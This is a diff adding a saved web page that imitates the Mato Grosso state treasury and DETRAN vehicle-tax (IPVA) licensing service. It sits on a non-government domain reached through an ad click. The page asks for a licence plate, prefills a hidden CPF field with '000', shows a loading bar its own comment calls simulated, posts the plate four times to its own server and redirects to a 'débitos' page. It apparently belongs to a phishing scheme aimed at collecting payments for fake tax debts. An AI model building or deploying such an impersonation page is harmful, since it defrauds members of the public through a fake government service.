@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<!-- saved from url=(0245)https://departamento-veiculosmt.com/fazenda/detran/licenciamento/?gad_source=1&gad_campaignid=23310869447&gbraid=0AAAAAoahyiCMB_L9ThQaY2_PMws3to4wz&gclid=CjwKCAiAtLvMBhB_EiwA1u6_PgLqXHIsk9pqetqMp8wdtpc6zKFKtii0rg1lMNvyBELPaSuUMCdByBoCSZwQAvD_BwE -->
+<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Fazenda IPVA MT 2026</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <script src="./Fazenda IPVA MT 2026_files/jquery-3.6.4.min.js.baixados"></script>
+  <script src="./Fazenda IPVA MT 2026_files/jquery.mask.min.js.baixados"></script>
+  
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link rel="shortcut icon" type="image/x-icon" href="https://departamento-veiculosmt.com/assets/icone_mt.png">
+    <link href="./Fazenda IPVA MT 2026_files/css2" rel="stylesheet">
+
+    <link rel="stylesheet" href="./Fazenda IPVA MT 2026_files/bootstrap.min.css">
+
+    <style>
+    * {
+        padding: 0;
+        margin: 0;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+
+        background: #fff;
+    }
+        
+        .atencaopix {
+            padding: 10px;
+            padding-bottom: 0;
+            border-bottom: solid 1px #ededed;
+            display: flex;
+            align-items: center;
+        }
+        
+        .boxmsg {
+            background: #f4ecbe;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 12px;
+        }
+        
+        .caixaplaca {
+            padding: 10px;
+            color: #393939;
+        }
+        
+        .caixaplaca h4, .caixaplaca h3 {
+            font-weight: 400;
+            font-size: 14px;
+        }
+        
+        form {
+            margin: auto;
+            width: 100%;
+            max-width: 307px;
+        }
+        
+        form input {
+            background-color: #ffffff;
+            border: solid 1px #ccc;
+            color: #393939;
+            font-size: 16px;
+            border-radius: 4px;
+            padding: 6px;
+            margin-top: -5px;
+            width: 100%;
+        }
+        
+        .cpfcnpjcheck {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+        
+        .cpfcnpjcheck label {
+            padding: 0 10px 0 5px;
+        }
+        
+        .ajudarenavam {
+            background-image: url(sprite-top-footer.png);
+            background-position: -554px -120px;
+            background-repeat: no-repeat;
+            display: inline-block !important;
+            height: 17px;
+            margin-top: 6px;
+            width: 16px;
+        }
+        
+        .tooltiptext {
+            width: 250px;
+            position: absolute;
+            margin-left: -250px;
+            margin-top: -135px;
+            padding: 10px;
+            border: 1px solid #CCC;
+            background: #fff;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .botaoEnviar {
+            margin-top: 20px;
+            padding-top: 10px;
+            display: flex;
+            justify-content: flex-start;
+            margin-top: -20px;
+            margin-left: 0;
+            margin-bottom: 20px;
+        }
+        
+        .botaoEnviar button {
+            background: #336699;
+            display: inline-block;
+            font-size: 14px;
+            padding: 4px 8px;
+            position: relative;
+            text-decoration: none;
+            z-index: 1;
+            border: 1px solid #336699;
+            border-bottom: 1px solid #336699;
+            color: #ffffff;
+            border-radius: 4px;
+            box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            padding: 6px 15px;
+            font-size: 15px;
+        }
+        
+        .modal-container {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: rgba(0, 0, 0, 0.5); /* Cor de fundo preto claro com transparência */
+          z-index: 999; /* Certifique-se de que está acima do conteúdo principal */
+        }
+        
+        .modal-content {
+          background: #fff; /* Cor de fundo do modal */
+          padding: 20px;
+          text-align: center;
+          border-radius: 8px;
+             display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .spinner {
+          border: 4px solid rgba(0, 0, 0, 0.1);
+          border-top: 4px solid #3498db;
+          border-radius: 50%;
+          width: 40px;
+          height: 40px;
+          margin-bottom: 20px;
+          animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+
+    header {
+      background: #fff;
+      color: #fff;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-content: center;
+      align-items: center;
+      padding: 10px 0;
+      font-size: 14px;
+    }
+
+    header p {
+      margin-bottom: 0;
+      width: 33.33%;
+    }
+
+    div#subheader {
+        background: #fff;
+        color: #000000;
+        border-top: solid 2px #336699;
+        text-align: right;
+        padding: 5px 5px;
+        font-size: 14px;
+        font-weight: 600;
+    }
+
+    #subheader button {
+      background: #fff;
+      border: none;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 20px 10px;
+      margin-right: 5px;
+    }
+
+    #subheader button:hover {
+      background: #b81f250d;
+    }
+
+    .vehicle-data li {
+        color: #0000008a;
+        font-size: 14px;
+        line-height: 20px;
+    }
+
+    .vehicle-data li span {
+        color: #161616;
+    }
+
+    .vehicle-data li svg {
+        fill: #757575;
+        width: 25px;
+    }
+
+    .vehicle-data ul {
+        padding: 0;
+        margin: 0;
+        margin-top: 20px;
+        display: flex;
+        flex-wrap: wrap;
+    }
+
+    .table {
+      margin-bottom: 0 !important;
+    }
+
+    .table thead th {
+      border-bottom: 2px solid #fff;
+      color: #757575;
+      font-weight: 400;
+      font-size: 14px;
+    }
+
+    tbody {
+      background: #f5f5f5;
+    }
+
+    tr.selectable-row {
+      border-bottom: solid 5px #fff;
+      border-top: solid 5px #fff;
+      font-size: 14px !important;
+    }
+
+    input.custom-checkbox {
+      margin-top: 8px;
+    }
+
+    .table td, .table th {
+      border-top: 1px solid #fff;
+    }
+
+    input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #327dff;
+      margin-top: 8px;
+      margin-right: -12px;
+    }
+
+    .subtotal-total {
+      margin-top: 5px;
+      text-align: right;
+      font-size: 16px;
+      color:#757575;
+    }
+
+    .custom-container {
+        padding: 20px;
+        border-radius: 0;
+        margin-bottom: 20px;
+        background: #fff;
+    }
+
+    .boxInfos {
+        width: 100%;
+        margin: 15px;
+        background: #f4f4f4;
+        padding: 20px;
+        font-size: 14px;
+        border-radius: 6px;
+    }
+
+    .infosDetalhes {
+        display: flex;
+    }
+
+    @media only screen and (max-width: 993px) {
+        .infosDetalhes {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .boxInfos {
+            width: auto;
+        }
+    }
+
+    @media only screen and (max-width: 400px) {
+        .botaoEnviar {
+            margin-top: 0;
+            margin-left: 0;
+            width: 100%;
+        }
+
+        .botaoEnviar button {
+            width: 100%;
+        }
+
+        input#renavam, input#numrDoc {
+            width: 100%;
+            margin-top: 5px;
+        }
+
+        .ajudarenavam {
+            display: none !important;
+        }
+
+        form {
+            padding: 0;
+            max-width: none;
+        }
+    }
+    </style>
+   
+<script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script></head>
+<body>
+    
+<div class="modal-container" id="modalLoading" style="display: none;">
+  <div class="modal-content">
+
+    <div class="spinner"></div>
+    <p id="mensagemStatus">Carregando... não saia ou feche o site.</p>
+    <div class="progress" style="width: 100%; margin-top: 15px; height: 8px;">
+    <div id="progressBar" class="progress-bar" role="progressbar" style="width: 0%; background-color: #3498db;"></div>
+    </div>
+
+  </div>
+</div>
+
+<header>
+    <img src="./Fazenda IPVA MT 2026_files/headermt.png" style="width: 100%;max-width: 700px; margin: auto;">
+</header>
+
+<div id="subheader">
+  Data: 13/02/2026 14:24:26</div>
+
+
+<div class="container">
+
+    <div class="caixaplaca">
+
+    <button type="button" onclick="window.location.href=&#39;/fazenda/detran/ipva/&#39;;" style="
+    background: #ffffff;
+    display: inline-block;
+    font-size: 14px;
+    padding: 4px 8px;
+    position: relative;
+    text-decoration: none;
+    z-index: 1;
+    border: 1px solid #336699;
+    border-bottom: 1px solid #336699;
+    color: #336699;
+    border-radius: 4px;
+    box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1);
+    cursor: pointer;
+    padding: 4px 6px;
+    font-size: 15px;
+">Voltar</button>
+
+        <div class="custom-container" style="margin-top: 5px;padding-left: 5px;padding-right: 5px;">
+            <p style=" font-weight: 600; text-align: center; border-bottom: solid 2px #330099; ">Emissão de Guia de Pagamento</p>
+            <form>
+                <div class="caixainput" style="margin-top: 10px; display:none;">
+                    <label style="display: block;margin-bottom: 0;">CPF/CNPJ</label>
+                    <input name="numrDoc" id="numrDoc" value="000" placeholder="Digite seu CPF/CNPJ">
+                </div>
+
+                <!--<div class="caixainput" style="margin-top: 10px; display:block;">
+                    <label style="display: block;margin-bottom: 0;">RENAVAM</label>
+                    <input name="vclRen" id="renavam" placeholder="Digite seu renavam">
+                    <div class="ajudarenavam"></div>
+                    <span class="tooltiptext"><img src="/assets/renavam.png" width="250"> </span>
+                </div>-->
+                
+                <div class="caixainput" style="margin-top: 10px; display:block;">
+                    <label style="display: block;margin-bottom: 0;">PLACA</label>
+                    <input name="vclRen" id="renavam" placeholder="Digite sua placa">
+                    <div class="ajudarenavam"></div>
+                    <span class="tooltiptext" style="display: none;"><img src="./Fazenda IPVA MT 2026_files/renavam.png" width="250"> </span>
+                </div>
+
+                <div class="botaoEnviar">
+                    <button type="button">Consultar</button>
+                </div>
+            </form>
+
+            <p class="error-message" id="error-message" style="color: #dc3545;margin-top: 10px;text-align: center;"></p>
+
+            <div class="infosDetalhes">
+                <div class="boxInfos" style="background:#fff;">
+                    <p style="text-align: center; margin-bottom: 5px; ">© Copyright 2001-2026 Secretaria de Estado de Fazenda de Mato Grosso - Todos os direitos reservados</p>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+</div>
+
+
+<script>
+    $(document).ready(function(){
+
+
+        let mensagensStatus = [
+            "Iniciando consulta...",
+            "Verificando informações...",
+            "Carregando detalhes do veículo...",
+            "Carregando débitos...",
+            "Finalizando consulta..."
+        ];
+
+        let indexMensagem = 0;
+        let progresso = 0;
+        let intervaloMensagens;
+        let intervaloProgresso;
+
+        function iniciarAnimacaoCarregamento() {
+            $("#mensagemStatus").text(mensagensStatus[0]);
+            indexMensagem = 1;
+            progresso = 0;
+
+            // Mensagens rotativas
+            intervaloMensagens = setInterval(() => {
+                if (indexMensagem < mensagensStatus.length) {
+                    $("#mensagemStatus").text(mensagensStatus[indexMensagem]);
+                    indexMensagem++;
+                }
+            }, 5000); // troca a cada 5 segundos
+
+            // Simulação de progresso (aumenta até 90% para não parecer travado no fim)
+            intervaloProgresso = setInterval(() => {
+                if (progresso < 90) {
+                    progresso += Math.floor(Math.random() * 3) + 1; // 1 a 3%
+                    $("#progressBar").css("width", progresso + "%");
+                }
+            }, 800);
+        }
+
+        function pararAnimacaoCarregamento() {
+            clearInterval(intervaloMensagens);
+            clearInterval(intervaloProgresso);
+            $("#progressBar").css("width", "100%");
+        }
+
+        
+        
+        //Fechar Modal
+        $("#modalLoading").hide();
+        
+        //Ajuda Renavam
+        $(function() {
+            $('.ajudarenavam').hover(function(){
+                $('.tooltiptext').show();
+            },
+            function(){
+                $('.tooltiptext').hide();
+            });
+        });
+        
+        //Validar CPF CNPJ
+        $('#checkcpf, #checkcnpj').click(function () {
+            var isCpfSelected = $(this).attr('id') === 'checkcpf';
+            var mask = isCpfSelected ? '000.000.000-00' : '00.000.000/0000-00';
+            
+            //console.log(isCpfSelected);
+            
+            var placeholder = isCpfSelected ? '___.___.___-__' : '__.___.___/____-__';
+            
+            $('#documento').attr('placeholder', placeholder);
+            $('#documento').val('').mask(mask.replace(/[0-9]/g, '9'));
+            
+            $('#checkcpf, #checkcnpj').not(this).prop('checked', false);
+        
+            // Limpar mensagem de erro
+            $('#error-message').text('');
+        });
+    
+        // Inicialmente selecionar CPF
+        $("#checkcpf").prop("checked", true).click();
+
+        $(".botaoEnviar button").click(function () {
+            $("#modalLoading").show();
+            $("#modalLoading").show();
+            $("#error-message").text("");
+            iniciarAnimacaoCarregamento();
+
+
+            const renavamDigitado = $("input[name='vclRen']").val();
+            const chassiDigitado = $("input[name='vclCsi']").val();
+            let docDigitado = $("#numrDoc").val().replace(/\D/g, '');
+            let infoDigitado = "";
+            let valorDigitado = "";
+
+            // Validação do CPF/CNPJ
+            if (docDigitado === "") {
+                $("#error-message").text("Informe o CPF ou CNPJ do proprietário.");
+                pararAnimacaoCarregamento();
+                $("#modalLoading").hide();
+                return;
+            }
+
+            // Verificar se foi preenchido chassi ou renavam
+            if (renavamDigitado === "" && chassiDigitado === "") {
+                $("#error-message").text("Informe o Renavam ou o Chassi do veículo.");
+                pararAnimacaoCarregamento();
+                $("#modalLoading").hide();
+                return;
+            }
+
+            // Identificar qual foi preenchido
+            if (renavamDigitado !== "") {
+                infoDigitado = "renavam";
+                valorDigitado = renavamDigitado;
+            } else {
+                infoDigitado = "chassi";
+                valorDigitado = chassiDigitado;
+            }
+
+            // Função que retorna uma Promise com a consulta
+            function consultaIPVA() {
+                return new Promise((resolve, reject) => {
+                    $.post("/detran/ipva/consulta/", {
+                        renavam: valorDigitado,
+                        doc: docDigitado,
+                        infoDigitado: infoDigitado,
+                        licenciamento: 'true',
+                    })
+                        .done((data) => {
+                            if (data.hasOwnProperty('erro')) {
+                                reject(data.erro);
+                            } else {
+                                resolve(data);
+                            }
+                        })
+                        .fail(() => {
+                            reject("Erro na requisição.");
+                        });
+                });
+            }
+
+            // Criar 4 chamadas simultâneas (igual ao original)
+            const chamadas = [
+                consultaIPVA(),
+                consultaIPVA(),
+                consultaIPVA(),
+                consultaIPVA()
+            ];
+
+            let terminou = false;
+
+            chamadas.forEach((promessa) => {
+                promessa.then((data) => {
+                    if (!terminou) {
+                        terminou = true;
+                        pararAnimacaoCarregamento();
+                        $("#modalLoading").hide();
+
+                        // Redireciona para a página de débitos com o renavam
+                        window.location.href = '/detran/consulta/debitos/' + valorDigitado;
+                    }
+                }).catch((erro) => {
+                    if (!terminou) {
+                        console.warn("Erro em uma das chamadas:", erro);
+                    }
+                });
+            });
+
+            Promise.any(chamadas)
+            .catch((aggregateError) => {
+                if (!terminou) {
+                    let mensagens = [];
+
+                    // Percorre os erros retornados
+                    for (const erro of aggregateError.errors) {
+                        mensagens.push(erro);
+                    }
+
+                    const mensagemFinal = mensagens.length ? mensagens[0] : "Não foi possível obter resposta. Tente novamente.";
+                    
+                    $("#error-message").text(mensagemFinal);
+                    pararAnimacaoCarregamento();
+                    $("#modalLoading").hide();
+                }
+            });
+
+        });
+
+    })
+</script>
+
+<script defer="" src="./Fazenda IPVA MT 2026_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;d402cd19a7e74f23908685bb8cb07b8d&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+</body></html>
